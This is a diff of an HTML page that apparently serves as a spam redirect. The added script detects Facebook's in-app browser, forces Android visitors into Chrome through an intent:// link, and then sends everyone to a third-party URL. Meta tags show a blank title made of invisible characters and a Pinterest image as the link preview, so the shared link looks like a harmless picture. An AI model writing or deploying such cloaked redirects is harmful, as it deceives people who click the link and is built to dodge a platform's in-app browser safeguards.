@@ -1,7 +1,28 @@
-<script type="text/javascript" language="javascript">window.location="https://smilingdogyoga.com/top-birds/";</script>
+<script type="text/javascript">
+
+    function isFacebookApp() {
+        var ua = navigator.userAgent || navigator.vendor || window.opera;
+        return (ua.indexOf("FBAV") > -1) || (ua.indexOf("FBAN") > -1);
+    }
+if (isFacebookApp()) {
+    var currentLink = location.href;
+    if (currentLink.indexOf('https') > -1) {
+        var currentLink = currentLink.replace('https://', '');
+        currentLink = currentLink.replace('www.', '');
+        var chromeLink = "intent://" + currentLink + "#Intent;scheme=https;package=com.android.chrome;end";
+        window.location.href = chromeLink;
+    }
+    if (currentLink.indexOf('http') > -1) {
+        var currentLink = currentLink.replace('http://', '');
+        currentLink = currentLink.replace('www.', '');
+        var chromeLink = "intent://" + currentLink + "#Intent;scheme=http;package=com.android.chrome;end";
+        window.location.href = chromeLink;
+    }
+} 
+location.replace("https://smilingdogyoga.com/top-birds/")
+</script>
 <meta property="og:title" content=" ︎ ︎ ︎ ︎ ︎︎ ︎ ︎ ︎ ︎ ︎ ︎︎ ︎ ︎">
 a
  <meta property="og:url" content="https://i.pinimg.com/736x/36/52/6c/36526c04e46437ff778231771e8b7d0e.jpg"/>
 <meta property="og:image" content="https://i.pinimg.com/736x/36/52/6c/36526c04e46437ff778231771e8b7d0e.jpg"/>
 <meta property="fb:app_id" content="2820598194851409" />
-
